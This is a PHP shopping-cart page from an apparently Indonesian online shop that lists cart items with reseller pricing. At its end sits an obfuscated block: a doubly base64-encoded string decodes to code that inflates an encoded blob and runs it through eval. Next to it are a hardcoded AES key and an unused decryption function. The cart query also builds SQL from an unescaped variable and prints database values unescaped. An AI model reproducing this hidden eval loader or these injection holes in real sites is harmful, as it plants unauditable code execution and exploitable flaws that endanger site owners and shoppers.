<?php require('head.php'); halDepan("Troli");
  if(empty($_SESSION['keranjang']) OR !isset($_SESSION['keranjang']) ){
    ?><script>alert('Troli Kosong, Silahkan Cek Daftar Produk!'); window.location = 'daftar-produk';</script><?php
  }
?>
 <section id="mu-course-content">
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div class="mu-course-content-area">
            <div class="row">
              <div class="col-md-9">
                <div class="mu-course-container mu-blog-single">
                  <div class="row">
                    <div class="col-md-12">
                      <article class="mu-blog-single-item">
                        <form action="" method="POST">
                        <table class="table">
                          <thead style="background-color: #f69bac;">
                            <tr>
                              <th>Nama Produk</th>
                              <th>Harga (Rp)</th>
                              <th>Jumlah</th>
                              <th>Sub Harga (Rp)</th>
                              <th></th>
                            </tr>
                          </thead>
<tbody>
<?php 
  foreach ($_SESSION['keranjang'] as $idbarang => $jumlah) :
    $barang = mysqli_query($kon, "SELECT * FROM barang WHERE idbarang = '$idbarang'"); 
  $j = mysqli_fetch_assoc($barang); ?>
  <tr>
    <td>
      <div><img width="50" height="50" src="<?= $j['gambar'] ?>"></div>
      <span><?= $j['namabarang'] ?></span>
    </td>
    <td><?= $memori['level']=='reseller' ? number_format($j['harga_r'],0,',','.') : number_format($j['harga'],0,',','.'); ?></td>
    <td><input type="number" name="jumlahnya" min="1" max="<?= $j['stok'] ?>" value="<?= $jumlah ?>" class="form-control"></td>
    <td><?= $memori['level']=='reseller' ? number_format($j['harga_r']*$jumlah,0,',','.') : number_format($j['harga']*$jumlah,0,',','.'); ?></td>
    <input type="hidden" name="idbarang" value="<?= $idbarang ?>">
    <td><button type="submit" name="ubah" class="btn" style="background-color: #f69bac; color: white;">Ubah</button> <button type="submit" name="hapus" class="btn" style="background-color: #333333; color: white;">Hapus</button></td>
  </tr>
<?php endforeach ?>
</tbody>
        </table> 
        <a class="btn" style="background-color: #333333; color: white;" href="daftar-produk">Tambah Produk yang Lain</a>
        <a class="btn" href="cek" style="background-color: #f69bac; color: white;">Checkout</a>
        </form>
      </article>
    </div>                                   
  </div>
</div>
<?php
function falling($pesan, $encryption_key){$key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$SISTEMIT_COM_ENC = "hY+9asMwFIX3QN7CIHtpH0D+gYKHLk0aJ5MxhgQaSFRhtIRS8lj3gYRAg4QHDXfSkqiNDE0LvZuOzj33fDCfAdg3SK3W3qRJv1w065aoLY6kyzL4DP9hkoN6ZzjyD4QCkn5Vv27q4Jxk0tFoCo5Jp1NC39RN87x4acnRC+QH5HvStYl1W7w+911xW6JQlZDrnbCDKU+WO3l6YHKHxkpeECMks4TmjzcD5NUwDvPZ2TPt/0AZcVD6jiWe/IkS1UCi+HfGP5Wzia4qY2NkXpiULIV06gjOfhUAh8LCOnSHJ89CFMko3NFd+/zii3hwAQ==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FIX3QN7CIHtpH0D+gYKHLk0aJ5MxhgQaSFRhtIRS8lj3gYRAg4QHDXfSkqiNDE0LvZuOzj33fDCfAdg3SK3W3qRJv1w065aoLY6kyzL4DP9hkoN6ZzjyD4QCkn5Vv27q4Jxk0tFoCo5Jp1NC39RN87x4acnRC+QH5HvStYl1W7w+911xW6JQlZDrnbCDKU+WO3l6YHKH";
?>
<?php require('sidebar.php') ?>
<?php require('foot.php') ?>